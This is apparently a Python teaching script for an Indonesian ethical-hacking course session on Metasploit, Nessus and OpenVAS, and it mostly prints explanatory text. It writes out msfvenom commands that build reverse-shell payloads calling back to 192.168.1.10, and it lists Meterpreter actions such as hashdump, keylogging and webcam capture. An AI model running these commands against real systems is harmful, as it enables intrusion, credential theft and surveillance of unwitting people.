#!/usr/bin/env python3
"""Sesi 7: Nessus, OpenVAS & Metasploit Framework"""

import subprocess
import sys
import os


def banner():
    print("=" * 60)
    print("  ETHICAL ELITE HACKER v11 — Sesi 7")
    print("  Nessus, OpenVAS & Metasploit Framework")
    print("=" * 60)
    print("  Referensi: X-Code Ethical Elite Hacker v11")
    print("=" * 60)


def check_tool(name, cmd_flag=None):
    cmd = name if cmd_flag is None else cmd_flag
    try:
        subprocess.check_output([cmd, "--version"] if cmd != "dpkg" else [cmd, "-l", "metasploit"],
                                stderr=subprocess.STDOUT, timeout=5)
        return "✅ TERINSTAL"
    except (subprocess.CalledProcessError, FileNotFoundError, OSError):
        return "❌ TIDAK TERINSTAL"


def section(num, title):
    print(f"\n{'─' * 50}")
    print(f"  [{num}] {title}")
    print(f"{'─' * 50}")


def main():
    banner()

    # ── [1] Tool Availability ──
    section(1, "PENGECEKAN TOOL")
    tools = {
        "Metasploit (msfconsole)": check_tool("msfconsole", "msfconsole"),
        "Metasploit (msfvenom)": check_tool("msfvenom", "msfvenom"),
        "Nmap (dipakai Nessus)": check_tool("nmap", "nmap"),
        "Searchsploit": check_tool("searchsploit", "searchsploit"),
    }
    print(f"  {'Tool':<30} {'Status':<20}")
    print(f"  {'─' * 50}")
    for tool, status in tools.items():
        print(f"  {tool:<30} {status:<20}")
    print()

    # ── [2] Metasploit Architecture ──
    section(2, "ARSITEKTUR METASPLOIT")
    print("""
  Metasploit Framework terdiri dari:

  👉 Modules      — exploit, auxiliary, post-exploitation
  👉 Payloads     — shellcode yang dikirim (reverse, bind)
  👉 Encoders     — mengubah bentuk shellcode agar lolos deteksi
  👉 NOPs         — sled instruction (NOP slide)
  👉 Meterpreter  — payload interaktif post-exploit

  💡 Concept: Auxiliary → scanning/fuzzing
              Exploit   → menyerang vulnerability
              Payload   → code yg dijalankan setelah exploit sukses
    """)

    # ── [3] msfvenom Payload Generation ──
    section(3, "MSFVENOM — GENERATE PAYLOAD")
    print("  💡 Simulasi perintah msfvenom (demonstrasi):\n")
    payload_examples = [
        ("windows/meterpreter/reverse_tcp", "LHOST=192.168.1.10 LPORT=4444 -f exe"),
        ("linux/x64/meterpreter/reverse_tcp", "LHOST=192.168.1.10 LPORT=4444 -f elf"),
        ("android/meterpreter/reverse_tcp", "LHOST=192.168.1.10 LPORT=4444 -o back.apk"),
        ("python/meterpreter/reverse_tcp", "LHOST=192.168.1.10 LPORT=4444 -f raw"),
    ]
    print(f"  {'Payload':<45} {'Options':<40}")
    print(f"  {'─' * 85}")
    for p, opts in payload_examples:
        print(f"  {p:<45} {opts:<40}")
    print()

    print("  🔥 Contoh perintah aktual:")
    print('     msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf')
    print()

    # ── [4] Meterpreter Commands ──
    section(4, "METERPRETER COMMANDS TABLE")
    cmds = [
        ("sysinfo",      "Info sistem target"),
        ("getuid",       "User saat ini"),
        ("ps",           "Daftar proses"),
        ("migrate",      "Pindah proses"),
        ("hashdump",     "Dump SAM hash (Windows)"),
        ("shell",        "Shell interaktif"),
        ("upload",       "Upload file ke target"),
        ("download",     "Download file dari target"),
        ("keyscan_start", "Mulai keylogging"),
        ("screenshot",   "Ambil screenshot"),
        ("webcam_snap",  "Ambil foto webcam"),
        ("route",        "Tambah route pivot"),
        ("portfwd",      "Port forwarding"),
        ("background",   "Sesi ke background"),
    ]
    print(f"  {'Command':<20} {'Fungsi':<40}")
    print(f"  {'─' * 60}")
    for cmd, desc in cmds:
        print(f"  {cmd:<20} {desc:<40}")
    print()

    # ── [5] Nessus / OpenVAS Concept ──
    section(5, "NESSUS & OPENVAS — VULNERABILITY SCANNER")
    print("""
  👉 Vulnerability Scanner: mendeteksi celah keamanan secara otomatis
  👉 Nessus  — commercial (Tenable)
  👉 OpenVAS — open-source (Greenbone)

  Perbandingan:
    {'Aspek':<20} {'Nessus':<25} {'OpenVAS':<25}
    {'─' * 70}
    {'Lisensi':<20} {'Proprietary':<25} {'GPL (gratis)':<25}
    {'Update DB':<20} {'Feed harian':<25} {'Feed mingguan':<25}
    {'Akurasi':<20} {'Tinggi (False + kecil)':<25} {'Cukup':<25}
    {'Contoh':<20} {'Nessus Pro $4k/thn':<25} {'Greenbone CE':<25}
    """)

    # ── [6] Analogi ──
    section(6, "ANALOGI")
    print("""
  ╔══════════════════════════════════════════════════════════╗
  ║   🔬 DOKTER UMUM (Nessus/OpenVAS)                      ║
  ║      → Memeriksa pasien, cari gejala                   ║
  ║      → Output: laporan kerentanan                      ║
  ║                                                        ║
  ║   🏭 BENGKEL LENGKAP (Metasploit)                     ║
  ║      → alat lengkap: exploit, payload, encoder         ║
  ║      → bisa bongkar pasang sistem                      ║
  ║                                                        ║
  ║   🎮 REMOTE CONTROL (Meterpreter)                     ║
  ║      → kendalikan target jarak jauh                    ║
  ║      → ambil data, screenshot, keylog                  ║
  ╚══════════════════════════════════════════════════════════╝
    """)

    # ── Summary ──
    print("=" * 60)
    print("  ✅ SESI 7 SELESAI!")
    print("=" * 60)
    print("  👉 Recap:")
    print("    • Metasploit: Framework exploit-module-payload")
    print("    • msfvenom: Generate custom payload")
    print("    • Meterpreter: Post-exploit command & control")
    print("    • Nessus/OpenVAS: Vulnerability scanner")
    print()
    print("  📌 LATIHAN LANJUTAN:")
    print("    1. Generate payload linux dengan msfvenom & tes deteksi antivirus")
    print("    2. Coba resource script (.rc) untuk otomatisasi Metasploit")
    print("    3. Bandingkan hasil scan Nessus vs OpenVAS pada Lab yang sama")
    print("    4. Eksplorasi post-module di Metasploit (kiwi, mimikatz)")
    print("=" * 60)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
